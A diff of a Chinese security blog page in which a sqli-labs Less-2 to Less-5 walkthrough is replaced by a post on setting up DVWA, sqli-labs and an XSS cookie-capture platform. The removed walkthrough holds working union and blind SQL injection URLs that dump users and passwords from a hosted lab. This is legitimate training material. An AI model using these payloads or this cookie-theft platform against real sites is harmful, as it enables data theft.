@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>sqli-labs 2-5 初识盲注 | Joner的博客</title>
+  <title>渗透环境搭建 | Joner的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Less-2 Less-3 Less-4 Less-5">
-<meta name="keywords" content="盲注,sql注入">
+  <meta name="description" content="本篇中将介绍一些渗透环境搭建的过程，这些环境将用于以后的实战练习 环境搭建下面搭建的一些漏洞环境需要依赖一些具体的服务，这里只列出需要提前安装好的环境,主要的是后面介绍渗透测试环境的搭建。">
+<meta name="keywords" content="环境搭建">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs 2-5 初识盲注">
-<meta property="og:url" content="http://yoursite.com/2019/03/26/sqli-labs-2-5-初识盲注/index.html">
+<meta property="og:title" content="渗透环境搭建">
+<meta property="og:url" content="http://yoursite.com/2019/04/08/渗透环境搭建/index.html">
 <meta property="og:site_name" content="Joner的博客">
-<meta property="og:description" content="Less-2 Less-3 Less-4 Less-5">
+<meta property="og:description" content="本篇中将介绍一些渗透环境搭建的过程，这些环境将用于以后的实战练习 环境搭建下面搭建的一些漏洞环境需要依赖一些具体的服务，这里只列出需要提前安装好的环境,主要的是后面介绍渗透测试环境的搭建。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-29T15:13:14.615Z">
+<meta property="og:updated_time" content="2019-04-08T12:04:20.361Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs 2-5 初识盲注">
-<meta name="twitter:description" content="Less-2 Less-3 Less-4 Less-5">
+<meta name="twitter:title" content="渗透环境搭建">
+<meta name="twitter:description" content="本篇中将介绍一些渗透环境搭建的过程，这些环境将用于以后的实战练习 环境搭建下面搭建的一些漏洞环境需要依赖一些具体的服务，这里只列出需要提前安装好的环境,主要的是后面介绍渗透测试环境的搭建。">
   
     <link rel="alternative" href="/atom.xml" title="Joner的博客" type="application/atom+xml">
   
@@ -149,104 +149,66 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sqli-labs-2-5-初识盲注" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-渗透环境搭建" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sqli-labs 2-5 初识盲注
+      渗透环境搭建
     </h1>
   
 
         
-        <a href="/2019/03/26/sqli-labs-2-5-初识盲注/" class="archive-article-date">
-  	<time datetime="2019-03-26T15:24:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-26</time>
+        <a href="/2019/04/08/渗透环境搭建/" class="archive-article-date">
+  	<time datetime="2019-04-08T12:03:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-08</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ul>
-<li>Less-2</li>
-<li>Less-3</li>
-<li>Less-4</li>
-<li>Less-5</li>
-</ul>
+        <p>本篇中将介绍一些渗透环境搭建的过程，这些环境将用于以后的实战练习</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下面搭建的一些漏洞环境需要依赖一些具体的服务，这里只列出需要提前安装好的环境,主要的是后面介绍渗透测试环境的搭建。</p>
 <a id="more"></a>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><blockquote>
-<p><a href="http://43.247.91.228:84/Less-2/" target="_blank" rel="noopener">地址</a></p>
-</blockquote>
-<p>在数字后加单引号报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p><strong>‘’ LIMIT 0,1’</strong>说明但单引号破坏了查询语句的平衡，可以推测出使用的是整数</p>
-<p><code>Select * from TABLE where id = (some integer value);</code></p>
-<p>所以对id没有任何处理，所以可以注入成功的有 <code>or 1=1</code> 或者<code>or 1=1 --+</code></p>
-<p>因此只需要将less1中的单引号去掉即可,同样使用<code>sqlmap</code>时，各项的命令的相同。</p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><blockquote>
-<p><a href="http://43.247.91.228:84/Less-3/" target="_blank" rel="noopener">地址</a></p>
-</blockquote>
-<p>数字后加单引号</p>
-<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></p>
-<p><strong>‘’1’’) LIMIT 0,1’</strong>说明使用的是 <code>SELECT * FROMusers WHERE id=(&#39;$id&#39;) LIMIT 0,1</code>这种查询方式</p>
-<p>所以可以注入的有</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;) or &apos;1&apos;=(&apos;1&apos;</span><br><span class="line">) or 1=1 --+</span><br></pre></td></tr></table></figure>
-<p>注入方式就是将less-1中的单引号改为 <code>&#39;)</code></p>
-<p>过程简单写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  order by 3 --+    #查询列数</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,database(),version()  --+</span><br><span class="line"># 查询数据库版本和数据库名字</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+    #查询数据库的表</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;  --+   #查询users表中的列名</span><br><span class="line">http://43.247.91.228:84/Less-3/?id=0 &apos;)  union select 1,group_concat(id,&apos;-&apos;,username,&apos;-&apos;,password),3 from users --+ #爆出所有数据</span><br></pre></td></tr></table></figure>
-<p>使用<code>sqlmap</code>时，各项的命令的相同。</p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><blockquote>
-<p><a href="http://43.247.91.228:84/Less-4/?id=1" target="_blank" rel="noopener">地址</a></p>
-</blockquote>
-<p>数字后加单引号不报错，加双引号报错</p>
-<p><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></p>
-<p>根据<strong>‘“1””) LIMIT 0,1’</strong> 推测使用<code>&quot;) --+</code> 闭合和注释</p>
-<p>查询源码，使用的查询语句为</p>
-<p><code>$sql=&quot;SELECT * FROMusers WHERE id=(“$id”) LIMIT 0,1&quot;;</code></p>
-<p>将less-1中构造的注入语句中的单引号改为 <code>&quot;)</code>就可以</p>
-<p>使用<code>sqlmap</code>时，各项的命令的相同。</p>
-<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><blockquote>
-<p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="noopener">地址</a></p>
-</blockquote>
-<p>这一关开始接触盲注，首先了解一下什么是盲注</p>
-<blockquote>
-<p>何为盲注？盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。从background-1中，我们可以知道盲注分为三类</p>
 <ul>
-<li>基于布尔SQL盲注</li>
-<li>基于时间的SQL盲注</li>
-<li>基于报错的SQL盲注</li>
+<li>PHP</li>
+<li>MySQL</li>
+<li>Java</li>
+<li>Apache</li>
+<li>tomcat</li>
 </ul>
-</blockquote>
-<p>这一关中当数据库命令执行出错时，只返回 <code>you are in....</code></p>
-<p><code>http://43.247.91.228:84/Less-5/?id=0</code>页面不正常，未出现<code>you are in ...</code></p>
-<p>加上单引号 <code>http://43.247.91.228:84/Less-5/?id=0 &#39; or 1=1 --+</code> 恢复正常</p>
-<p>所以推测数据库查询语句和第一关一样 ,只要闭合单引号就可以</p>
-<p>使用<code>length()</code>函数会返回相应字段的长度</p>
-<p>构造语句查询数据库的长度</p>
-<p><code>http://43.247.91.228:84/Less-5/?id=1 &#39; and length(database())&gt;7  --+</code>不断增加后面的数字，直到页面出现变化，判定出数据库名字的长度为8</p>
-<p>下面开始猜每一位具体是什么</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&gt;&apos;a&apos;  --+正常    </span><br><span class="line"></span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&lt;&apos;z&apos;  --+ 正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and left(database(),1)&lt;&apos;m&apos;  --+ 错误</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>这样猜下去就能得到每一位的值，但是太麻烦。可以用脚本判断，或者直接用sqlmap</p>
-<p>猜解名字还可以使用 substr() ascii()函数进行尝试，这里使用它们来获得security数据库下的表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;90 --+#页面正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;120 --+#异常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&gt;100 --+#正常</span><br><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))&lt;110 --+#正常</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-<p>这样使用二分法猜解下去，最后得到第一个值为 ‘e’，然后修改  limit 0,1),1,1) 中倒数第二个1的数值，来猜解第一个表名的每一位，修改 limit后面的那个0，来确定不同的表，这样依次猜解下去就得到了所有的表名。</p>
-<p>下面猜解列名，使用<code>regexp</code>正则表达式进行查询</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1 &apos; and  1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^username&apos; limit 0,1)  --+# 页面正常</span><br></pre></td></tr></table></figure>
-<p>同样，将<code>username</code>改成<code>password</code>和 <code>id</code>也对，这里可以使用正则表达式来猜解列名，这里只是说明原理，具体操作可以使用工具或者自己写脚本。</p>
-<blockquote>
-<p>MID()函数</p>
-<p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p>
-</blockquote>
-<blockquote>
-<p>ORD() 函数</p>
-<p>ORD() 函数返回字符串第一个字符的 <a href="http://www.nowamagic.net/academy/tag/ASCII" target="_blank" rel="noopener">ASCII</a> 值。</p>
-<p>语法： ORD(string)</p>
-</blockquote>
-<p>接下来使用<code>mid()函数</code>和<code>ord()</code>函数来获得users表中的内容，获得username中的第一行的第一个字符，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.247.91.228:84/Less-5/?id=1&apos; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure>
-<p>就使用这样的语句，修改相应的值，不断重复，最后就获得了所有的值。</p>
-<p>因为比较简单，这里使用sqlmap还是和之前一个样。</p>
+<h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><h3 id="DVWA介绍"><a href="#DVWA介绍" class="headerlink" title="DVWA介绍"></a>DVWA介绍</h3><p>DVWA是一款开源的渗透测试漏洞练习平台，其中内含XSS、SQL注入、文件上传漏洞、文件包含、CSRF和暴力破解等各个难度的测试环境。</p>
+<p>DVWA一共包含十个模块，每个模块的代码都有4种安全等级：Low、Medium、High、Impossible，下面是是个模块的内容</p>
+<p>1.Bruce Force //暴力破解</p>
+<p>2.Command Injection //命令注入</p>
+<p>3.CSRF //跨站请求伪造</p>
+<p>4.File Inclusion //文件包含</p>
+<p>5.File Upload //文件上传漏洞</p>
+<p>6.Insecure CAPTCHA //不安全的验证</p>
+<p>7.SQL Injection //sql注入</p>
+<p>8.SQL Injection（Blind） //sql注入（盲注）</p>
+<p>9.XSS（Reflected） //反射型XSS</p>
+<p>10.XSS（Stored） //存储型XSS</p>
+<h3 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h3><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">DVWA</a></p>
+<p>在github上下载DVWA项目，将它放到站点目录下，然后到<code>config</code>目录下修改<code>config.inc.php.dist</code>文件，将以下几处根据自己的情况做修改</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_DVWA = <span class="keyword">array</span>();</span><br><span class="line">$_DVWA[ <span class="string">'db_server'</span> ]   = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$_DVWA[ <span class="string">'db_database'</span> ] = <span class="string">'dvwa'</span>;	<span class="comment">#数据库名称</span></span><br><span class="line">$_DVWA[ <span class="string">'db_user'</span> ]     = <span class="string">'root'</span>;	<span class="comment">#数据库用户名</span></span><br><span class="line">$_DVWA[ <span class="string">'db_password'</span> ] = <span class="string">'p@ssw0rd'</span>;<span class="comment">#数据库密码</span></span><br></pre></td></tr></table></figure>
+<p>修改完成后，<strong>将文件名后面的.dist去掉</strong>，然后进入通过浏览器进入<code>http://127.0.0.1/DVWA-master/setup.php</code>，单击<code>Create/Reset Database</code>按钮进行安装，安装后使用默认用户名密码<code>admin/password</code>即可进入</p>
+<h2 id="搭建sqli-labs注入平台"><a href="#搭建sqli-labs注入平台" class="headerlink" title="搭建sqli-labs注入平台"></a>搭建sqli-labs注入平台</h2><h3 id="sqli-labs介绍"><a href="#sqli-labs介绍" class="headerlink" title="sqli-labs介绍"></a>sqli-labs介绍</h3><p>sqli-labs是一款学SQL注入的开源平台，共有75种不同类型的注入</p>
+<ul>
+<li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">地址</a></li>
+</ul>
+<h3 id="安装sqli-labs"><a href="#安装sqli-labs" class="headerlink" title="安装sqli-labs"></a>安装sqli-labs</h3><p>在github上下载源码后，打开<code>sql-connections</code>文件夹中的<code>db-creds.inc</code>文件，在下面几处根据自己的情况做修改，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//give your mysql connection username n password</span></span><br><span class="line">$dbuser =<span class="string">'root'</span>;	 <span class="comment">#数据库用户名	</span></span><br><span class="line">$dbpass =<span class="string">'11111'</span>;	 <span class="comment">#数据库密码</span></span><br><span class="line">$dbname =<span class="string">"security"</span>; <span class="comment">#数据库名称</span></span><br><span class="line">$host = <span class="string">'localhost'</span>; <span class="comment">#地址</span></span><br><span class="line">$dbname1 = <span class="string">"challenges"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后在浏览器中打开<code>http://127.0.0.1/sqli-labs-master</code>，点击<code>Setup/reset Database for labs</code>进行安装。当页面出现数据库等创建成功的页面时，就表示安装成功了。</p>
+<h2 id="搭建XSS测试平台"><a href="#搭建XSS测试平台" class="headerlink" title="搭建XSS测试平台"></a>搭建XSS测试平台</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XSS测试平台是测试XSS漏洞获取cookie并接收Web页面的平台，XSS可以做JS所有能做的事，包括但不仅限于窃取cookie、后台文章处理、钓鱼、网页重定向、获取用户信息等，下面使用的是xsser测试平台的源码。</p>
+<h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h3><p>下载源码后，将它解压到网站目录，打开<code>config.php</code>文件，修改如下部分的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$config[<span class="string">'dbHost'</span>]		= <span class="string">""</span>;			<span class="comment">//数据库地址</span></span><br><span class="line">$config[<span class="string">'dbUser'</span>]		= <span class="string">""</span>;				<span class="comment">//用户</span></span><br><span class="line">$config[<span class="string">'dbPwd'</span>]		= <span class="string">""</span>;				<span class="comment">//密码</span></span><br><span class="line">$config[<span class="string">'database'</span>]		= <span class="string">""</span>;			<span class="comment">//数据库名</span></span><br><span class="line">$config[<span class="string">'charset'</span>]		=<span class="string">'utf8'</span>;				<span class="comment">//数据库字符集</span></span><br><span class="line">$config[<span class="string">'tbPrefix'</span>]		=<span class="string">'oc_'</span>;					<span class="comment">//表名前缀</span></span><br><span class="line">$config[<span class="string">'dbType'</span>]		=<span class="string">'mysql'</span>;			<span class="comment">//数据库类型(目前只支持mysql)</span></span><br><span class="line"><span class="comment">/* 注册配置 */</span></span><br><span class="line">$config[<span class="string">'register'</span>]		=<span class="string">'normal'</span>;				<span class="comment">//normal,正常;invite,只允许邀请注册;close,关闭注册功能</span></span><br><span class="line">$config[<span class="string">'mailauth'</span>]		=<span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
+<p>首先在数据库中建立一个专门的库，这里以<code>xsser</code>举例，然后选中这个库，导入文件夹中的<code>xssplatform.sql</code>数据库文件，然后执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> oc_module SETcode=<span class="keyword">REPLACE</span>(code,<span class="string">'http://xsser.me'</span>,<span class="string">'http://localhost/xsserme'</span>)</span><br></pre></td></tr></table></figure>
+<p>同时需要修改<code>authtest.php</code>中的网址改为自己的URL。</p>
+<p>接下来访问搭建XSS平台的URL,首先注册新用户，然后在oc_user表中修改注册用户的adminLevel为1，再将config.php注册配置中的normal改为invite。</p>
 
       
 
@@ -286,11 +248,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">盲注</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">环境搭建</a>
         		</li>
       		
 		</ul>
@@ -346,7 +304,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/26/sqli-labs-2-5-初识盲注/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/08/渗透环境搭建/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -360,18 +318,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/03/29/sqli-labs-6-7-布尔型盲注-延时注入/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sqli-labs 6-7 布尔型盲注 延时注入
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/03/24/通过sqli-labs学习sql注入/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">通过sqli-labs学习sql注入</div>
+    <a href="/2019/04/05/sqli-labs-Less9-基于时间的盲注/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sqli-labs Less9-10 基于时间的盲注</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -398,7 +347,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">1.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">2.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">3.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">4.</span> <span class="toc-text">Less-5</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建DVWA漏洞环境"><span class="toc-number">2.</span> <span class="toc-text">搭建DVWA漏洞环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA介绍"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装DVWA"><span class="toc-number">2.2.</span> <span class="toc-text">安装DVWA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建sqli-labs注入平台"><span class="toc-number">3.</span> <span class="toc-text">搭建sqli-labs注入平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-labs介绍"><span class="toc-number">3.1.</span> <span class="toc-text">sqli-labs介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安装sqli-labs"><span class="toc-number">3.2.</span> <span class="toc-text">安装sqli-labs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#搭建XSS测试平台"><span class="toc-number">4.</span> <span class="toc-text">搭建XSS测试平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#介绍"><span class="toc-number">4.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搭建"><span class="toc-number">4.2.</span> <span class="toc-text">搭建</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -444,8 +393,8 @@
      
       <script type="text/javascript">
         var gitment = new Gitment({
-			  id: 'sqli-labs 2-5 初识盲注',
-			  title: 'sqli-labs 2-5 初识盲注',
+			  id: '渗透环境搭建',
+			  title: '渗透环境搭建',
 			  owner: 'joner11234',
 			  repo: 'joner11234.github.io',
 			  oauth: {
